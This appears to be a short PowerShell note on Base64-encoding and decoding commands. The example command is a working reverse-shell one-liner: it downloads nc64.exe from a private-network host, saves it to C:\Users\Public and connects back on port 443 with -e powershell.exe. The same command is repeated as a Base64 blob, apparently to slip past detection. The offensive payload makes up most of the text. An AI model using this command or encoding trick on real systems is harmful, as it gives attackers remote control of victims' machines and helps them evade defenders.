#To encode a command in Base64

$string='wget http://192.168.0.210/nc64.exe -OutFile C:\Users\Public\nc64.exe;C:\Users\Public\nc
64.exe 192.168.0.210 443 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))

#To decode a command from Base64

$string = "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAyADEAMAAvAG4AYwA2ADQALgBlAHgAZ
QAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAbgBjADYANAAuAGUAeABlADsAQwA6AFwAVQBzAGUAcgBzAFwAUAB1A
GIAbABpAGMAXABuAGMANgA0AC4AZQB4AGUAIAAxADkAMgAuADEANgA4AC4AMAAuADIAMQAwACAANAA0ADMAIAAtAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAU
wB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQA="

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))
